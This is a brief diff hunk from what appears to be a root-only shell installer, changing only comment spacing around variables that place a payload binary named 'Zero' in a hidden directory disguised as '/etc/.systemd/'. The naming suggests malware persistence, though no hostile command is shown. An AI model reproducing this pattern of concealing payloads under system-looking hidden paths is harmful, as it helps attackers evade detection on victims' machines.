@@ -21,7 +21,7 @@ if [ "$EUID" -ne 0 ]; then
     exit 1
 fi
 
-HIDDEN_DIR="/etc/.systemd/"           # Directory for binaries
+HIDDEN_DIR="/etc/.systemd/"               # Directory for binaries
 PAYLOAD_NAME="Zero"#$                     # Name of binary to installs (preferably .elf)
 PAYLOAD="${HIDDEN_DIR}${PAYLOAD_NAME}"    # Full path to payload
 
